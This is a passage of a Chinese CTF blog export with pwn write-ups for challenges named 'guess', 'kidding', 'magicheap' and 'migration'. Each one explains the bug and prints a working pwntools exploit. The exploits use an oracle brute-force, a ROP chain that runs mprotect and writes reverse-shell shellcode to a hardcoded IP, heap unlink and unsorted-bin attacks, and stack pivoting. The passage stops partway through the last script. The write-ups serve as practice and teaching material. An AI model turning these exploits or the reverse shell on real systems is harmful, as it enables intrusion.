<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>下载下来的文件是用来本地测试的，开了socket，监听9999端口，其实就是模拟服务器跑的程序，所以本地通信建一个socket就好。重点是is_flag_correct()函数，是一个验证用户输入的函数，所以这个看起来更像一个逆向题。</p>
<p>调用这个函数前有一个fgets(inbuf,0x1000,stdin)，如果长度这么长，那么在flag_hexa = flag_hex的时候构造一个100*’A’+’\x00’即可绕过长度检查，造成溢出，不过这个测试之后发现好像没什么用，fuzz没什么异常，继续看函数，里面check flag是通过跟一个预存在栈上的flag数组对比确定的，但是是通过bin_by_hex这个数组做了一次映射确定，而这个数组初始化又是由0x401100LL地址上的数据完成的，有趣的是这个数组的0x30处正是0，其ascii码也是0x30，同理A-F的ascii码对应其数组的索引。因此这个比较只需要用户按顺序输入flag即可，这个比较当然不如直接让用户输入和flag对比来的快，所以这里面一定有什么设计。</p>
<p><img src="/2020/09/03/jarvisOj_guess/1.jpg" alt="code"><br><img src="/2020/09/03/jarvisOj_guess/2.jpg" alt="code2"><br><img src="/2020/09/03/jarvisOj_guess/3.jpg" alt="bin_by_hex"></p>
<h2 id="程序漏洞"><a href="#程序漏洞" class="headerlink" title="程序漏洞"></a>程序漏洞</h2><p>漏洞就出现在数组索引的检查，数组其实就是一个字符串指针，array[i]等同于*(array+i)，所以当i为负数时，其得到的数据是字符串指针低地址处的数据，这里的flag位置是ebp-0x150，bin_hex_index的位置在ebp-0x110，因此bin_hex_index[-0x40]即flag[0]，想要验证成功，只需value1 = 0,value2 = flag[i]。flag[i] = bin_hex_index[-0x40+i]，即用户输入chr(-0x40+i)，但是注意chr()范围是0-256，因此-0x40+i需要+0x100(模100类似格式化字符串以前的知识)，最终构造出一个完美验证通过的payload。<br>仅仅通过验证不是目的，我们还得知道真正的flag是什么，这里因为我们已经通过payload通过了验证，那么现在只需要修改Payload的第一、二字节，使其为ascii(20-127)，重复验证，一旦得到通过即可确定第一个字节，后面的也同理，两个字节两个字节的确定，直到所有payload都被替换成真正的flag</p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"error"</span>)</span><br><span class="line">sh = remote(<span class="string">'pwn.jarvisoj.com'</span>,<span class="number">9878</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess</span><span class="params">(data)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'guess&gt; '</span>)</span><br><span class="line">    sh.sendline(data)</span><br><span class="line">    response = sh.recvline().strip(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">if</span> response == <span class="string">'Nope.'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">init_payload = <span class="string">''</span></span><br><span class="line">offset = <span class="number">0x100</span><span class="number">-0x40</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        init_payload += <span class="string">'0'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        init_payload += chr(offset + (i<span class="number">-1</span>)/<span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span> len(init_payload)</span><br><span class="line"><span class="comment">#init_payload = "504354467b3439643433313061313038353837353536373933323635316535353965313533636663386264323762340" + init_payload[95:]</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>,<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">20</span>,<span class="number">128</span>):</span><br><span class="line">            temp = hex(j)[<span class="number">2</span>:]</span><br><span class="line">            init_payload = init_payload[:i] + temp.ljust(<span class="number">2</span>,<span class="string">'0'</span>) + init_payload[i+<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">if</span> guess(init_payload) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span> str(i)+<span class="string">':'</span>+init_payload</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> init_payload</span><br><span class="line">flag = init_payload.decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<p>中间recv会报timeout，可以修改for循环start，断点验证，之后hex_encode即可</p>
<h2 id="编外"><a href="#编外" class="headerlink" title="编外"></a>编外</h2><p>看别人的wp有说patch改掉alarm然后方便调试的，这里也记录一下吧，虽然自己没调试</p>
<p>找到call _alarm位置，option-&gt;general,number of opcode bytes改为8<br>选中mov edi,78h call _alarm,打开Edit-&gt;Patch Program-&gt;change bytes<br>最后Edit-&gt;Patch Program-&gt;Apply patches to input file</p>
<p><img src="/2020/09/03/jarvisOj_guess/5.jpg" alt="patch"><br><img src="/2020/09/03/jarvisOj_guess/6.jpg" alt="res"></p>
]]></content>
      <categories>
        <category>jarvisOj</category>
      </categories>
  </entry>
  <entry>
    <title>kidding</title>
    <url>/2020/09/03/kidding/</url>
    <content><![CDATA[<h1 id="tsctf-gt-kidding"><a href="#tsctf-gt-kidding" class="headerlink" title="tsctf-&gt;kidding"></a>tsctf-&gt;kidding</h1><h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>这个程序非常简单，输出两句话，栈溢出。不过这里坑的是把标准输入输出和标准错误都给关掉了。另外程序是静态编译的，没有动态运行库，因此不存在got表之类的东西，考察的是ROP的运用。<br>(前天做梦梦到做出来了，昨天没做出来，晚上看了17的wp解决了困惑，今早终于做出来了Orz)</p>
<p><img src="/2020/09/03/kidding/1.jpg" alt="main"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞就是这个栈溢出，p4nda师傅说这种静态编译的一般都是用系统调用，关闭输入输出的情况下大多使用dup2把文件描述符复制到sockfd上，构造reverse shell，在本地开一个socket监听，远端连接本地socket，其shell里执行的结果会输出到我们接收的socket中，从而得到flag。主要思路是打开stdin、stdout和stderr，用sys_mprotect给bss段加上可执行权限，再将可以执行reverse_shell的shellcode写入到bss段，最终调转到这里执行即可</p>
<h3 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h3><p>根据Linux64位的调用规则，rax存储syscall的系统调用号，rdi、rsi、rdx分别为函数调用从左到右的前三个参数存储的寄存器。使用ROPgadget可以找到可用的gadgets，下图为示例，其余同理。之后拼接凑成rop_function，可以接收三个参数并执行执行系统调用的函数</p>
<p><img src="/2020/09/03/kidding/2.jpg" alt="gadgets"></p>
<h3 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h3><p>用step1得到的rop_funtion打开stdin,stdout,stderr。用类似的调用mprotect(0x601000,0x2000,7)。这里需要注意mprotect调用的地址需要是按页对齐的，范围len也是按页对齐的，即4kb的整数倍，2^12对应十六进制为0x1000的整数倍，因此虽然我选择写入shellcode的地址是0x602160(buf)，需要改变的却是整个段的执行权限，7表示rwx。</p>
<h3 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h3><p>向bss段写入shellcode,这里的shellcode是网上找的<a href="https://www.exploit-db.com/exploits/41477" target="_blank" rel="noopener">refernce</a>，根据自己的IP地址把第一个push的字节码修改一下，比如我的ip是192.168.65.135，即把”\x68\xc0\xa8\x01\x2d”改成”\x68\xC0\xA8\x41\x87”。可以先将shellcode执行一遍看看是否无误，本地起监听的命令为<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -l 4444 -vv</span><br></pre></td></tr></table></figure></p>
<p>step3是遇到的最大的难题，因为我一直在寻找一个系统调用往指定地址写数据(甚至花了一天时间)。直到思而不得看了17的wp才发现自己实在是太笨了- -,哪需要什么系统调用去写数据，直接一个mov qword ptr des,[src]就能把数据挪过去，需要的是把数据放在栈上，然后pop des,pop src,mov des, [src]即可。这里还是用ROPgadget配合grep寻找，我们一次写入8字节，因此grep -F ‘mov qword ptr [‘即可。注意这里是rdi+0x20，因此我们的rdi应当是target_adddr - 0x20</p>
<p><img src="/2020/09/03/kidding/3.jpg" alt="find"></p>
<h3 id="step4"><a href="#step4" class="headerlink" title="step4"></a>step4</h3><p>ret(0x602160)即可</p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">p = process(<span class="string">'./kidding'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./kidding'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    gdb.attach(p,gdbscript=<span class="string">"b *0x40029c"</span>)</span><br><span class="line"><span class="comment">#    gdb.attach(p,gdbscript="b *0x400740")</span></span><br><span class="line"></span><br><span class="line">call_rbx = <span class="number">0x400455</span></span><br><span class="line">call_rax = <span class="number">0x40024e</span></span><br><span class="line"></span><br><span class="line">pop_rbx = <span class="number">0x40045d</span></span><br><span class="line">pop_rdi = <span class="number">0x40077c</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400d64</span></span><br><span class="line">pop_rdx = <span class="number">0x4005d5</span></span><br><span class="line">pop_rax = <span class="number">0x400121</span></span><br><span class="line">mov_rdi_0x20_rax = <span class="number">0x400c01</span></span><br><span class="line">syscall = <span class="number">0x400740</span></span><br><span class="line">main_addr = <span class="number">0x40025a</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rop_func</span><span class="params">(rax,rdi,rsi,rdx)</span>:</span></span><br><span class="line">    payload = p64(pop_rax) + p64(rax) + p64(pop_rdi) + p64(rdi) + p64(pop_rsi_r15) + p64(rsi) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(rdx) + p64(syscall)</span><br><span class="line">    <span class="comment">#payload += '6'*8*6</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rop1_func</span><span class="params">(rax,rdi,rsi,rdx)</span>:</span></span><br><span class="line">    payload = p64(pop_rax) + p64(rax) + p64(pop_rdi) + rdi + p64(pop_rsi_r15) + p64(rsi) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(rdx) + p64(syscall)   </span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rop2_func</span><span class="params">(rax,rdi,rsi,rdx)</span>:</span></span><br><span class="line">    payload = p64(pop_rax) + p64(rax) + p64(pop_rdi) + p64(rdi) + p64(pop_rsi_r15) + rsi + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(rdx) + p64(syscall)   </span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">reverse_shellcode = <span class="string">"\x68\xc0\xa8\x41\x87\x66\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x6a\x10\x6a\x29\x6a\x01\x6a\x02\x5f\x5e\x48\x31\xd2\x58\x0f\x05\x48\x89\xc7\x5a\x58\x48\x89\xe6\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x48\xff\xc6\x48\x83\xfe\x02\x7e\xf3\x48\x31\xc0\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_to_bss</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    total_len = len(reverse_shellcode)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> total_len &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> total_len &gt;= <span class="number">8</span>:</span><br><span class="line">            payload += p64(pop_rax) + reverse_shellcode[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>] + p64(pop_rdi) + p64(<span class="number">0x602160</span> - <span class="number">0x20</span> + i * <span class="number">8</span>) + p64(mov_rdi_0x20_rax)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            total_len -= <span class="number">8</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(pop_rax) + reverse_shellcode[i*<span class="number">8</span>:] + (<span class="number">8</span>-len(reverse_shellcode[i*<span class="number">8</span>:])) * <span class="string">'\x90'</span> + p64(pop_rdi) + p64(<span class="number">0x602160</span> - <span class="number">0x20</span> + i * <span class="number">8</span>) + p64(mov_rdi_0x20_rax)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            total_len = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvline()</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#reverse shell</span></span><br><span class="line">    open0 = rop_func(<span class="number">2</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">7</span>)</span><br><span class="line">    open1 = rop_func(<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">7</span>)</span><br><span class="line">    open2 = rop_func(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">7</span>)</span><br><span class="line">    change_bss = rop_func(<span class="number">10</span>,<span class="number">0x601000</span>,<span class="number">0x2000</span>,<span class="number">7</span>)</span><br><span class="line">    <span class="comment">#mov shellcode to bss</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x18</span></span><br><span class="line">    payload += open0 + open1 + open2 + change_bss + write_to_bss() + p64(<span class="number">0x602160</span>)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>tsctf2018</category>
      </categories>
  </entry>
  <entry>
    <title>magicheap</title>
    <url>/2020/09/03/magicheap/</url>
    <content><![CDATA[<h1 id="magicheap"><a href="#magicheap" class="headerlink" title="magicheap"></a>magicheap</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>两种方法，温习常规思路</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>main函数主要有三个功能，create,edit和delete，当choice为0x1305,magic &gt; 0x1305时我们可以看flag，magic位于bss，我们需要做一次地址任意写</p>
<p><img src="/2020/09/03/magicheap/1.jpg" alt="main"></p>
<p><img src="/2020/09/03/magicheap/2.jpg" alt="create"></p>
<p><img src="/2020/09/03/magicheap/3.jpg" alt="edit"></p>
<p><img src="/2020/09/03/magicheap/4.jpg" alt="delete"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>第一种方法是unlink，不赘述了，注意第二个chunk分配的大小大于0x80，不能属于fastbin，伪造的chunk属于fastbin</p>
<p>第二种方法是unsorted bin attack，我们先建4个堆块，其中第一个和第三个是unsorted bin范围的chunk，依次free(0)、free(2)，链表的结构如下：<br>chunk2-&gt;main_arena+88-&gt;chunk0-&gt;chunk2</p>
<p><img src="/2020/09/03/magicheap/5.jpg" alt="heap"></p>
<p>之后edit溢出覆盖chunk2的bk为magic_addr-0x10，此时bins的情况如下，最后create(0x80)使得*magic=unsorted_chunks(av)=main_arena+88，成功查看flag</p>
<p><img src="/2020/09/03/magicheap/6.jpg" alt="bins"></p>
<h2 id="unlink-py"><a href="#unlink-py" class="headerlink" title="unlink.py"></a>unlink.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">p = process(<span class="string">'./magicheap'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./magicheap'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size of Heap : '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Content of heap:'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(index,new_size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Size of Heap : '</span>)</span><br><span class="line">    p.sendline(str(new_size))</span><br><span class="line">    p.recvuntil(<span class="string">'Content of heap :'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    heap_array = <span class="number">0x6020e0</span></span><br><span class="line">    shell_addr = <span class="number">0x400c23</span></span><br><span class="line">    exit_got = elf.got[<span class="string">'exit'</span>]</span><br><span class="line">    <span class="comment">#unlink</span></span><br><span class="line">    Create(<span class="number">0x40</span>,<span class="string">'a'</span>*<span class="number">7</span>+<span class="string">'\n'</span>)</span><br><span class="line">    Create(<span class="number">0x80</span>,<span class="string">'a'</span>*<span class="number">7</span>+<span class="string">'\n'</span>)</span><br><span class="line">    Create(<span class="number">0x40</span>,<span class="string">'a'</span>*<span class="number">7</span>+<span class="string">'\n'</span>)</span><br><span class="line">    fd = (heap_array) - <span class="number">0x18</span></span><br><span class="line">    bk = (heap_array) - <span class="number">0x10</span></span><br><span class="line">    payload = p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)+p64(fd)+p64(bk)</span><br><span class="line">    payload += (<span class="number">0x40</span>-len(payload)) * <span class="string">'b'</span></span><br><span class="line">    payload += p64(<span class="number">0x40</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">    Edit(<span class="number">0</span>,len(payload)+<span class="number">1</span>,payload)</span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Edit(<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+p64(exit_got))</span><br><span class="line">    Edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(shell_addr))</span><br><span class="line">    Exit()</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="unsorte-bin-attack-py"><a href="#unsorte-bin-attack-py" class="headerlink" title="unsorte-bin-attack.py"></a>unsorte-bin-attack.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">p = process(<span class="string">'./magicheap'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./magicheap'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size of Heap : '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Content of heap:'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(index,new_size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Size of Heap : '</span>)</span><br><span class="line">    p.sendline(str(new_size))</span><br><span class="line">    p.recvuntil(<span class="string">'Content of heap :'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    magic_addr = <span class="number">0x6020C0</span></span><br><span class="line">    Create(<span class="number">0x80</span>,<span class="string">'a'</span>*<span class="number">7</span>+<span class="string">'\n'</span>)</span><br><span class="line">    Create(<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">7</span>+<span class="string">'\n'</span>)</span><br><span class="line">    Create(<span class="number">0x80</span>,<span class="string">'a'</span>*<span class="number">7</span>+<span class="string">'\n'</span>)</span><br><span class="line">    Create(<span class="number">0x80</span>,<span class="string">'a'</span>*<span class="number">7</span>+<span class="string">'\n'</span>)</span><br><span class="line">    Delete(<span class="number">2</span>)</span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#heap overflow</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(<span class="number">0</span>) + p64(magic_addr<span class="number">-0x10</span>)</span><br><span class="line">    Edit(<span class="number">1</span>,len(payload)+<span class="number">1</span>,payload)</span><br><span class="line">    Create(<span class="number">0x80</span>,<span class="string">'xmzyshypnc\n'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(str(<span class="number">0x1305</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Hitcon-Training</category>
      </categories>
  </entry>
  <entry>
    <title>migration</title>
    <url>/2020/09/03/migration/</url>
    <content><![CDATA[<h1 id="migration"><a href="#migration" class="headerlink" title="migration"></a>migration</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>中期忙完之后抽两天刷题，hitcon-training的题，主要考察stack pivoting</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>可以溢出的长度为0x14字节，且开头有检查，要么改掉count，要么只能挑一次Main。</p>
<p><img src="/2020/09/03/migration/1.jpg" alt="main"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>最开始的想法是构造bss_addr+puts_plt+call_setvbuf_addr+puts_got泄露出返回地址，之后到call_setvbuf继续执行，ebp为bss_addr作为假的栈，在这个栈里read后再执行system函数，但是这样会报invalid address的错误，此路不通，选择更复杂的栈帧构造。</p>
<p>首先了解一下函数调用的规则，按照刚才的结构，溢出之后的对应是main_ebp+return_addr+fake_bep+arg1+arg2+…+code..这里的调用顺序是return_addr(args)-&gt;fake_ebp(此时的ebp为main_ebp)-&gt;code。假如code里继续调用别的函数，其规则跟上面一致，不妨设code=call_func+code_ebp+func_args，那么最终的调用情况是return_addr(args)-&gt;fake_ebp(ebp为main_ebp)-&gt;call_func(args)-&gt;code_ebp。这里还有一张图辅助了解pivoting的。</p>
<p><img src="/2020/09/03/migration/stackPivot.jpg" alt="pivot"></p>
<p>最终的利用思路是找几个gadgets，第一次溢出的时候往buf2里写入数据，并最终跳转到buf2去执行刚才写入的数据，这里设计的结构是：<br>buf2+read_plt+leave_ret_addr+0+buf2+0x100，执行的时候buf2作为ebp，调用read(0,buf2,0x100),调用结束后leave 使得esp = buf2，ret 使得去执行buf2+4的代码。</p>
<p>buf2写入的数据用来泄露libc地址，设计的结构是：<br>buf + puts_plt + pop_ebx_ret + puts_got + read_plt + leave_ret_addr + 0 + buf + 0x100<br>执行的时候buf作为ebp，调用puts(puts@got)泄露出地址，之后的pop_ebx_ret把栈里的puts_got弹出，ret到read继续执行read(0,buf,0x100)，结束之后leave_ret使得函数跳转到buf+4执行代码</p>
<p>buf读取的内容包括写入’/bin/sh\x00’和执行system。设计的结构为：<br>buf2 + read_plt + pop_esi_edi_ebp + 0 + buf2 + 0x100 + system_addr + ‘b’*4 + buf2，执行过程中先read(0,buf2,0x100)读取’/bin/sh\x00’到buf2，之后pop_esi_edi_ebp把0、buf2、0x100弹出，此时esp为system_addr，执行system(“/bin/sh\x00”)拿到Shell</p>
<h1 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">p = process(<span class="string">'./migration'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./migration'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    gdb.attach(p,<span class="string">'b *0x8048505'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">    buf = <span class="number">0x0804a70c</span></span><br><span class="line">    buf2 = <span class="number">0x0804a60c</span></span><br><span class="line">    pop_ebp = <span class="number">0x0804856b</span></span><br><span class="line">    pop_ebx = <span class="number">0x0804836d</span></span><br><span class="line">    ret = <span class="number">0x08048356</span></span><br><span class="line">    pop_esi_edi_ebp = <span class="number">0x08048569</span></span><br><span class="line">    leave = <span class="number">0x08048418</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'Try your best :\n'</span>)</span><br><span class="line">    <span class="comment">#stack migration to buf2</span></span><br><span class="line">    payload = <span 